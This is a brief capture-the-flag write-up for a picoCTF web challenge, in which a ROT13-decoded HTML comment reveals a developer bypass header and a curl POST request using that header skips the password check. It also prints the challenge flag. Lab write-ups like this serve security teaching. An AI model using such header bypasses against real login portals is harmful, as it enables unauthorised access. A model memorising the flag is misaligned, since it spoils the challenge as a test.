# Crack the Gate1

## Problem Situation
Sensitive information is hidden in a restricted web portal. We know the email required for login, but we do not know the password. Find the flag using a method hidden by the developer.

## Solution Approach
By checking the HTML of the webpage, we found an encrypted message in the comments. After decoding it using ROT13, we obtained the phrase:

temporary bypass: use header "X-Dev-Access: yes"

Using this information, we sent a request with curl to always satisfy the condition for a successful login, which allowed us to obtain the correct flag.

curl -X POST https://<challenge-url>/login \
-H "X-Dev-Access: yes" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "email=ctf-player@picoctf.org&password=test"

Answer

picoCTF{brut4_f0rc4_cbb8faa7}
